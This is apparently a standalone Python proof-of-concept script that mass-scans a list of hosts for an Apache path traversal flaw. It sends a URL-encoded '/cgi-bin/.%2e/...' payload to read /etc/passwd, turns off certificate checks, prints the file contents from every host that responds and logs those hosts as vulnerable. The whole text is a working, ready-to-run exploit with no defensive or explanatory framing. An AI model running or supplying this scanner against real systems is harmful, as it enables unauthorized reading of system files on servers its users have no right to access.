import requests, sys, os, threading, queue, re
from sys import argv
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def usage():
    print('\n python3 poc.py hosts.txt ')
    print(' python3 poc.py path_to_hosts_list ')
    print('[+] please make sure that ur hosts list contains urls in this format http://site.com [+]')
    print('[+] starts with a uri schema and doesn\' end with a backslash / [+]')

if len(argv) != 2:
    usage()
    sys.exit(0)
else:
    script, hosts = argv
    if os.path.exists(hosts):
        pass
    else:
        print("File doesn't exist")
        usage()
        sys.exit(0)
   

with open(hosts, 'r') as f:
    hosts = [line.rstrip() for line in f]

def worker():
    while True:
        worker = q.get()
        cve_check(worker)
        q.task_done()

thread_lock = threading.Lock()
q = queue.Queue()
report_hosts = open('apache_poc_results.txt', 'w')

def cve_check(line):
    try:
        with thread_lock:
            endpoint = 'etc/passwd'
            payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/"
            res = requests.get(f"{line}{payload}{endpoint}", verify=False, timeout=2, allow_redirects= False)
            indicators = 'root|nologin|sbin|usr|bin'
            check = re.findall(indicators, res.text)
            if check:
                if res.status_code == 200:
                    print(f"[+] Vulnerable Host : {line} [+]")
                    print(res.text)
                    report_hosts.write(line+"\n")
            else:
                print(f"[-] Not Vulnerable {line} [-]")
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.Timeout:
        pass
for r in range(4):
    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()

for line in hosts:
    if line:
        q.put(line)
q.join()
report_hosts.close()
